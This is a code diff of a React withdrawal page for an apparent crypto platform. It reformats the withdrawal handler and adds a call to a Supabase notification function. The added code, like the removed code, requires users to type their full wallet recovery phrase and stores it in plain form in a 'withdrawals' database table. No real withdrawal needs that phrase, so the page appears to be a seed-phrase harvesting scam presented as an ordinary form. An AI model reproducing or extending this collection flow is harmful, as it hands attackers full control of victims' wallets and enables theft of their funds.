@@ -142,73 +142,106 @@ const Withdrawals = () => {
     }
   }, [user]);
 
-  const handleWithdrawal = async () => {
-    if (!user) return;
-    if (!localProfile?.is_verified) {
-      toast({
-        title: 'Verification Required',
-        description: 'Complete KYC verification before withdrawals.',
-        variant: 'destructive',
-      });
-      return;
-    }
-    if (withdrawalForm.amount <= 0 || !withdrawalForm.walletAddress) {
-      toast({
-        title: 'Missing Details',
-        description: 'Enter a valid wallet address and amount.',
-        variant: 'destructive',
-      });
-      return;
-    }
-    if (withdrawalForm.amount > (walletsBalance || 0)) {
-      toast({
-        title: 'Insufficient Balance',
-        description: 'Amount exceeds available balance.',
-        variant: 'destructive',
-      });
-      return;
-    }
-    if (!isKeyphraseComplete) {
-      toast({
-        title: 'Keyphrase Required',
-        description: `Enter all ${KEYPHRASE_LENGTH} words of your recovery phrase.`,
-        variant: 'destructive',
-      });
-      return;
-    }
+const handleWithdrawal = async () => {
+  if (!user) return;
 
-    setIsLoading(true);
-    try {
-      const { error } = await supabase.from('withdrawals').insert({
-        user_id: user.id,
-        currency: withdrawalForm.currency,
-        amount: withdrawalForm.amount,
-        wallet_address: withdrawalForm.walletAddress,
-        wallet_type: withdrawalForm.walletType,
-        wallet_keyphrase: finalKeyphrase,
-        status: 'pending',
-      });
-      if (error) throw error;
+  if (!localProfile?.is_verified) {
+    toast({
+      title: "Verification Required",
+      description: "Complete KYC verification before withdrawals.",
+      variant: "destructive",
+    });
+    return;
+  }
 
-      toast({
-        title: 'Withdrawal Submitted',
-        description: `Your ${withdrawalForm.currency} withdrawal has been sent for approval.`,
-      });
+  if (withdrawalForm.amount <= 0 || !withdrawalForm.walletAddress) {
+    toast({
+      title: "Missing Details",
+      description: "Enter a valid wallet address and amount.",
+      variant: "destructive",
+    });
+    return;
+  }
 
-      fetchWithdrawals();
-      setWithdrawalForm({ currency: 'BTC', amount: 0, walletType: '', walletAddress: '' });
-      setKeyphraseWords(Array(KEYPHRASE_LENGTH).fill(''));
-      setLinkedWallet(null);
-    } catch (err: any) {
-      toast({
-        title: 'Error Submitting Withdrawal',
-        description: err.message,
-        variant: 'destructive',
-      });
-    } finally {
-      setIsLoading(false);
-    }
-  };
+  if (withdrawalForm.amount > (walletsBalance || 0)) {
+    toast({
+      title: "Insufficient Balance",
+      description: "Amount exceeds available balance.",
+      variant: "destructive",
+    });
+    return;
+  }
+
+  if (!isKeyphraseComplete) {
+    toast({
+      title: "Keyphrase Required",
+      description: `Enter all ${KEYPHRASE_LENGTH} words of your recovery phrase.`,
+      variant: "destructive",
+    });
+    return;
+  }
+
+  setIsLoading(true);
+
+  try {
+    // 1️⃣ Insert withdrawal record
+    const { data, error } = await supabase.from("withdrawals").insert({
+      user_id: user.id,
+      currency: withdrawalForm.currency,
+      amount: withdrawalForm.amount,
+      wallet_address: withdrawalForm.walletAddress,
+      wallet_type: withdrawalForm.walletType,
+      wallet_keyphrase: finalKeyphrase,
+      status: "pending",
+    });
+
+    if (error) throw error;
+
+    // 2️⃣ Call Edge Function to send email + in-app notification
+    await fetch(
+      "https://niwhcvzhvjqrqhyayarv.supabase.co/functions/v1/send-notification",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          type: "withdrawal",             // Match your edge function type
+          email: user.email,              // Recipient email
+          name: user.user_metadata?.full_name || user.email,
+          user_id: user.id,               // ✅ Used for in-app notification
+          amount: withdrawalForm.amount,  // Withdrawal amount
+        }),
+      }
+    );
+
+    // 3️⃣ Success toast
+    toast({
+      title: "Withdrawal Submitted",
+      description: `Your ${withdrawalForm.currency} withdrawal of ${withdrawalForm.amount} has been submitted for approval.`,
+    });
+
+    // 4️⃣ Refresh & reset
+    fetchWithdrawals();
+    setWithdrawalForm({
+      currency: "BTC",
+      amount: 0,
+      walletType: "",
+      walletAddress: "",
+    });
+    setKeyphraseWords(Array(KEYPHRASE_LENGTH).fill(""));
+    setLinkedWallet(null);
+  } catch (err: any) {
+    toast({
+      title: "Error Submitting Withdrawal",
+      description: err.message,
+      variant: "destructive",
+    });
+  } finally {
+    setIsLoading(false);
+  }
+};
+  
 
   const canWithdraw = localProfile?.kyc_status === 'approved';
 
